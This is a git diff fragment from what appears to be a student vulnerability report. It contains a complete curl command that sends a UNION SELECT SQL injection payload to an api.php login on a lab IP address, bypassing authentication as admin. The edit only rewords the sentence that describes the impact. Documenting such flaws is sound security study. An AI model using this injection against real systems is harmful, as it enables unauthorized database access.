@@ -115,7 +115,7 @@ The variable *$user* is used in an SQL statement without any type of quoting. Th
 curl -v http://192.168.56.103/api.php -d "module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"
 ```
 [^5]![alt text](https://github.com/Fashion-Man/ECE-9609-9069/blob/6f21e008f45548a2314105ce8cca4eadc5c30fea/sqli_api_php.png)
-This will allow access to the database as an administrator. More details can be found [here](https://kerbit.io/research/read/blog/3). 
+This would allow hackers to access the database as administrators. More details can be found [here](https://kerbit.io/research/read/blog/3). 
 
 
 ## The users
